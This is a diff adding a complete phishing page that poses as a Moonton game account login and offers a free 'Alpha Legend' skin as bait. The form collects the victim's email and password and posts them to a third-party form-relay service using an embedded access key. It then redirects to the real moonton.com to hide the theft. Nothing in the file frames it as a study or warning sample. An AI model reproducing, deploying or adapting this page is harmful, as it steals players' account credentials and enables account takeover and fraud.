@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="img/png/gif" href="logo moonton.png">
+    <title>Free Alpha Legend skin</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('background.jpg') no-repeat center center/cover;
+        }
+        .login-container {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+            color: white;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        .btn {
+            background: yellow;
+            color: black;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            opacity: 0.5;
+        }
+        .btn:hover {
+            background: orange;
+        }
+        .terms {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        .terms input {
+            width: auto;
+            margin-right: 10px;
+        }
+    </style>
+    <script>
+        function toggleButton() {
+            var checkbox = document.getElementById('terms');
+            var button = document.getElementById('loginBtn');
+            button.disabled = !checkbox.checked;
+            button.style.opacity = checkbox.checked ? '1' : '0.5';
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <img src="logo moonton.png" alt="moonton logo" width="150" height="100">
+        <h3>Get your free Legend alpha skin to Login your Moonton Account</h3>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="70d3ce22-c498-4060-adf3-14b045580266">
+
+            <input type="email" name="email" placeholder="Moonton Email" required>
+            <input type="password" name="moontonP" placeholder="Password" required>
+
+            <input type="hidden" name="redirect" value="https://www.moonton.com">
+            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+            <div class="terms">
+                <input type="checkbox" id="terms" onclick="toggleButton()">
+                <label for="terms">I agree to the Terms and Conditions</label>
+            </div>
+            <button class="btn" id="loginBtn" disabled>Login</button>
+        </form>
+    </div>
+</body>
+</html>
